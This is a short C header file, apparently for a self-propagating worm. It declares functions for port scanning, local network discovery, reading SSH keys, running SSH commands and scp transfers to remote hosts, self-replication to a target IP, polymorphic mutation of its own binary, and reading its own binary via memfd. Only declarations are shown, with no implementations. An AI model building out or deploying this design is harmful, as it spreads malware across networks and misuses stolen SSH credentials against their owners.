#ifndef UTILS_H
#define UTILS_H

#include <stddef.h>
#include <stdint.h>

// Base64 encoding
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length);

// Executable path detection
char* get_executable_path(const char* argv0);

// Network utilities
int scan_port(const char* ip, int port, int timeout_sec);

// Self-replication
int self_replicate(const char* target_ip, const char* argv0, 
                   const char* remote_path,
                   int (*execute_cmd_func)(const char* ip, const char* command));

// SSH key discovery
int read_ssh_keys(char** key_list, int max_keys);

// Network discovery
void get_local_ips(char** ip_list, int* count, int max_ips);

// Polymorphic mutation
unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_t* new_len);

// SSH operations
int run_ssh_command(const char* ip, const char* key_path, const char* user, const char* command);
int scp_transfer(const char* ip, const char* key_path, const char* user, const char* local_file, const char* remote_file);

// Binary reading with memfd support
unsigned char* read_own_binary(const char* argv0, size_t* file_size);

#endif // UTILS_H

